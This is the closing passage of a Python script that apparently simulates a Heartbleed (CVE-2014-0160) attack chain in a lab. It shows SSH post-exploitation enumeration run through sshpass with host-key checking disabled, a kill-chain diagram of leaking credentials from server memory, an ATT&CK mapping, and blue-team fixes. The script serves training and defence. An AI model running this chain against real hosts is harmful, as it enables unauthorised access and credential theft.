        ("sudo Privileges",    "sudo -l 2>/dev/null || echo 'No sudo access'"),
    ]

    for label, cmd in commands:
        info(f"[bold]{label}[/bold]")
        cmd_display(f"sshpass -p '***' ssh {ssh_user}@{victim} '{cmd}'")
        rc, out, _ = run(
            ["sshpass", "-p", ssh_pass,
             "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
             "-p", str(ssh_port),
             f"{ssh_user}@{victim}", cmd],
            timeout=20,
        )
        if rc == 0 and out.strip():
            for line in out.strip().splitlines()[:8]:
                console.print(f"      [dim white]{line}[/dim white]")
        else:
            console.print(f"      [dim](no output or command failed)[/dim]")
        console.print()

    STATE["loot"]["post_exploit"] = "completed"
    ok("Post-exploitation enumeration complete")
    console.print()


# =============================================================================
#  Phase 6: Report
# =============================================================================

def phase_report():
    phase_header(6, "OPERATION REPORT",
                 "Summary, ATT&CK mapping, kill chain flow, defensive recommendations")

    duration = datetime.now() - STATE["start_time"]
    vuln_confirmed = STATE["loot"].get("vuln_confirmed", False)
    total_leaked = STATE.get("total_leaked_bytes", 0)
    creds_found = len(STATE.get("leaked_creds", []))
    strings_found = len(STATE.get("leaked_strings", []))

    # Operation summary
    console.print(Panel(
        f"[bold]Heartbleed Attack Simulation Complete[/bold]\n\n"
        f"  Duration           : {str(duration).split('.')[0]}\n"
        f"  Target             : [yellow]{STATE['victim_ip']}:{STATE['https_port']}[/yellow]\n"
        f"  Service            : nginx 1.6.3 + OpenSSL 1.0.1f\n"
        f"  Vulnerability      : [bold red]CVE-2014-0160 (Heartbleed)[/bold red]\n"
        f"  CVSS               : [bold red]7.5 High[/bold red] (real-world impact: Critical)\n"
        f"  Vulnerability Found: {'[bold green]YES[/bold green]' if vuln_confirmed else '[yellow]Unconfirmed[/yellow]'}\n"
        f"  Memory Leaked      : [bold yellow]{total_leaked:,} bytes ({total_leaked / 1024:.1f} KB)[/bold yellow]\n"
        f"  Credentials Found  : {'[bold red]' + str(creds_found) + '[/bold red]' if creds_found else '[green]0[/green]'}\n"
        f"  Interesting Strings: {strings_found}\n"
        f"  SSH Access         : {'[bold red]YES[/bold red]' if STATE['loot'].get('ssh_access') else '[dim]No[/dim]'}",
        title="[bold green][+] OPERATION SUMMARY[/bold green]",
        border_style="bold green",
        padding=(1, 4),
    ))
    console.print()

    # Attack timeline
    console.rule("[bold blue]Attack Chain Timeline[/bold blue]", style="blue")
    tlt = Table(box=box.SIMPLE_HEAD)
    tlt.add_column("Phase", style="cyan", width=10)
    tlt.add_column("Name", style="white", width=28)
    tlt.add_column("Technique", style="dim")
    tlt.add_column("Result", width=10)
    timeline = [
        ("Phase 1", "Reconnaissance",         "nmap port scan + TLS fingerprinting"),
        ("Phase 2", "Vulnerability Detection", "nmap ssl-heartbleed / sslscan / sslyze"),
        ("Phase 3", "Credential Planting",     "POST credentials into server heap memory"),
        ("Phase 4", "Exploitation",            "Raw TLS Heartbeat buffer over-read"),
        ("Phase 5", "Post-Exploitation",       "SSH login + system enumeration"),
    ]
    for phase, name, detail in timeline:
        tlt.add_row(phase, name, detail, "[bold green][+][/bold green]")
    console.print(Padding(tlt, (0, 2)))
    console.print()

    # Kill chain flow diagram
    console.rule("[bold yellow]Kill Chain Flow[/bold yellow]", style="yellow")
    console.print("""
  [cyan]Attacker[/cyan] scans target with nmap, discovers HTTPS on port 443
      |
      v
  [cyan]Attacker[/cyan] runs ssl-heartbleed NSE script
      |
      v
  [bold red]CVE-2014-0160 CONFIRMED[/bold red] -- OpenSSL 1.0.1f is vulnerable
      |
      v
  [cyan]Attacker[/cyan] sends POST requests to plant credentials in memory
      |
      v
  [cyan]Attacker[/cyan] sends malformed TLS Heartbeat request:
      |   ContentType: 0x18 (Heartbeat)
      |   Declared length: 16384 bytes
      |   Actual payload: 1 byte
      |
      v
  [yellow]OpenSSL[/yellow] copies 16383 bytes of adjacent heap memory into response
      |
      v
  [cyan]Attacker[/cyan] receives and parses leaked memory
      |   Searches for: passwords, tokens, keys, session data
      |
      v
  [bold red]CREDENTIALS EXTRACTED[/bold red] from server process memory
      |
      v
  [cyan]Attacker[/cyan] uses leaked/known credentials for SSH access
      |
      v
  [bold red]FULL SYSTEM ACCESS as webuser[/bold red]
    """)

    # MITRE ATT&CK mapping
    console.rule("[bold white]MITRE ATT&CK Coverage[/bold white]", style="white")
    mt = Table(box=box.SIMPLE, title="Techniques Used")
    mt.add_column("Tactic", style="magenta", width=22)
    mt.add_column("Technique ID", style="cyan", width=14)
    mt.add_column("Technique Name", style="white")
    for tactic, tid, name in MITRE:
        mt.add_row(tactic, tid, name)
    console.print(Padding(mt, (0, 2)))
    console.print()

    # Blue team recommendations
    console.rule("[bold green]Blue Team Defensive Recommendations[/bold green]", style="green")
    recs = [
        ("T1595.002", "Upgrade OpenSSL to 1.0.1g or later (Heartbleed was patched in April 2014)"),
        ("T1595.002", "Recompile all software linked against vulnerable OpenSSL versions"),
        ("T1592.002", "After patching, revoke and reissue all TLS certificates (private keys may be compromised)"),
        ("T1552.001", "Rotate all passwords and session tokens that may have been in server memory"),
        ("T1552.001", "Enable Perfect Forward Secrecy (PFS) cipher suites to limit exposure"),
        ("T1557",     "Deploy IDS/IPS rules to detect Heartbleed exploitation (anomalous TLS Heartbeat sizes)"),
        ("T1040",     "Monitor for unusual TLS Heartbeat traffic patterns (large response payloads)"),
        ("T1078",     "Implement multi-factor authentication to limit credential reuse"),
        ("All",       "Use OpenSSL builds compiled with -DOPENSSL_NO_HEARTBEATS if Heartbeat is not needed"),
        ("All",       "Regularly scan infrastructure with nmap ssl-heartbleed or similar tools"),
        ("All",       "Segment networks to limit lateral movement after credential compromise"),
    ]
    for tid, rec in recs:
        console.print(f"  [green]>[/green] [dim][{tid}][/dim] {rec}")
    console.print()

    # Final impact panel
    console.print(Panel(
        "[bold red]IMPACT SUMMARY[/bold red]\n\n"
        "  An [bold]unauthenticated[/bold] attacker can read up to [bold]64KB[/bold] of server\n"
        "  process memory per request by sending a malformed TLS Heartbeat.\n\n"
        "  [bold]No credentials are needed.[/bold]\n"
        "  [bold]No server logs are generated.[/bold]\n"
        "  [bold]The attack is completely passive and undetectable by default.[/bold]\n\n"
        "  Leaked memory may contain:\n"
        "    - TLS private keys (allowing traffic decryption)\n"
        "    - User passwords and session tokens\n"
        "    - HTTP request/response data from other users\n"
        "    - Any data processed by the server in recent memory\n\n"
        "  At scale, repeated exploitation can reconstruct significant portions\n"
        "  of server memory, including the TLS certificate private key.",
        title="[bold red]CVE-2014-0160 -- CVSS 7.5 (Real-World: Critical)[/bold red]",
        border_style="bold red",
        padding=(1, 4),
    ))
    console.print()


# =============================================================================
#  Main
# =============================================================================

def main():
    banner()
    configure()

    console.print(Panel(
        "  [cyan]Phase 1[/cyan]  Reconnaissance              (port scan, HTTPS fingerprint)\n"
        "  [cyan]Phase 2[/cyan]  Vulnerability Detection      (nmap ssl-heartbleed, sslscan)\n"
        "  [cyan]Phase 3[/cyan]  Credential Planting           (POST data into server memory)\n"
        "  [cyan]Phase 4[/cyan]  Exploitation                  (Heartbleed memory leak)\n"
        "  [cyan]Phase 5[/cyan]  Post-Exploitation             (SSH login, enumeration)\n"
        "  [cyan]Phase 6[/cyan]  Report & ATT&CK Mapping",
        title="[bold]Attack Chain Overview[/bold]",
        border_style="blue",
    ))
    console.print()

    phases = [
        ("Reconnaissance",         phase_recon),
        ("Vulnerability Detection", phase_detection),
        ("Credential Planting",     phase_plant_credentials),
        ("Exploitation",            phase_exploit),
        ("Post-Exploitation",       phase_post_exploit),
        ("Report",                  phase_report),
    ]

    try:
        for i, (name, func) in enumerate(phases, 1):
            try:
                func()
                if i < len(phases):
                    if not Confirm.ask(
                        f"\n  [bold cyan]Phase {i} ({name}) complete. Continue to Phase {i+1}?[/bold cyan]",
                        default=True,
                    ):
                        info("Skipping remaining phases, jumping to report...")
                        phase_report()
                        break
            except KeyboardInterrupt:
                console.print(f"\n[yellow]Phase {i} ({name}) interrupted.[/yellow]")
                if not Confirm.ask("  Continue to next phase?", default=True):
                    break
            except Exception as exc:
                err(f"Phase {i} ({name}): {exc}")
                console.print_exception(show_locals=False)
                if not Confirm.ask("  Continue despite error?", default=True):
                    break
    except KeyboardInterrupt:
        console.print("\n[red]Aborted.[/red]")
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]Aborted.[/red]")
        sys.exit(1)
